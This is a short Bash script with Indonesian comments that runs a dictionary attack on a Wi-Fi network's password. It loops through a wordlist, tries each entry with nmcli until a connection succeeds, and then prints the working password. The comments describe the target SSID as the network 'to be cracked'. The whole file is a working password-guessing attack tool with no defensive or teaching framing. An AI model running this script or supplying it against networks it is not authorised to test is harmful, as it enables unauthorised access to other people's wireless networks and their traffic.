#!/bin/bash

# Pastikan nama interface Wi-Fi dan SSID diisi dengan benar
INTERFACE="wlan0"  # Ganti dengan nama interface Wi-Fi yang sesuai
SSID="NAMA_WIFI"    # Ganti dengan SSID jaringan Wi-Fi yang ingin di-crack
DICTIONARY_FILE="path/to/dictionary.txt"  # Ganti dengan path ke file dictionary

# Periksa apakah file dictionary ada
if [ ! -f "$DICTIONARY_FILE" ]; then
    echo "File dictionary tidak ditemukan: $DICTIONARY_FILE"
    exit 1
fi

# Fungsi untuk mencoba menghubungkan ke Wi-Fi
try_connect() {
    PASSWORD="$1"
    echo "Mencoba koneksi dengan kata sandi: $PASSWORD"
    
    # Menghubungkan ke jaringan menggunakan nmcli
    nmcli device wifi connect "$SSID" password "$PASSWORD"
    
    # Periksa status koneksi
    if nmcli -t -f ACTIVE,SSID dev wifi | grep -q '^yes:'; then
        echo "Berhasil terhubung ke $SSID dengan kata sandi: $PASSWORD"
        exit 0
    fi
}

# Membaca file dictionary dan mencoba setiap kata sandi
while IFS= read -r password; do
    try_connect "$password"
done < "$DICTIONARY_FILE"

echo "Semua kata sandi telah dicoba, tidak ada yang berhasil."
